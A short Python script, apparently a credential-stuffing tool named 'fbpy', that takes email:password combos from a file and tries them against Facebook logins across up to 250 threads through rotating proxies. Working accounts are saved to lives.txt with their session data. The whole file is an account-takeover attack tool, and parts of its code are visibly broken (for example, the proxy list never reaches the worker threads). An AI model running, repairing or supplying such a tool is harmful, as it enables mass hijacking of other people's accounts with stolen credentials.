from fb import Facebook
import random
import json
import threading

OUTPUT_FORMAT = "%s : %s  /   %s"
MAX_THREADS = 250
THREADS = [threading.Thread]

combolist = False
proxylist = False

queue = []

def output(email, password, result):
    global OUTPUT_FORMAT
    return print(OUTPUT_FORMAT % (email, password, result))


def brute():
    global queue
    while len(queue) > 0:
        combo = queue.pop()
        password = False
        email = False

        try:
            email = combo.split(':')[0].replace('\r', '').replace('\n', '')
            password = combo.split(':')[1].replace('\r', '').replace('\n', '')
        except:
            output(email, password, 'Wrong Format')

        f = Facebook(email, password, random.choice(proxylist))
        auth = f.login()

        if 'error' in auth:
            output(email, password, auth['error'])
        elif 'success' in auth:
            output(email, password, 'LIVE!')
            lives = open('lives.txt', 'a')
            lives.write("==================\n")
            lives.write(" EMAIL %s / PASSWORD %s\n" % (email, password))
            raw_results = json.dumps(auth['success'])
            lives.write(" %s\n\n" % (raw_results))
            lives.write("==================\n\n")


def start():
    global THREADS, MAX_THREADS
    while len(THREADS) < MAX_THREADS:
        t = threading.Thread(target=brute)
        t.start()
        THREADS.append(t)

def welcome():
    print("fbpy")
    print("Starting process...")
    print(" ")

def main():
    global queue

    welcome()

    try:
        proxylist = open('proxies.txt', 'r').readlines()
        combolist = open('combos.txt', 'r').readlines()
    except Exception as exc:
        exit('Error on load lists.  Exception: %s' % (type(exc).__name__))

    queue = combolist
    start()


main()
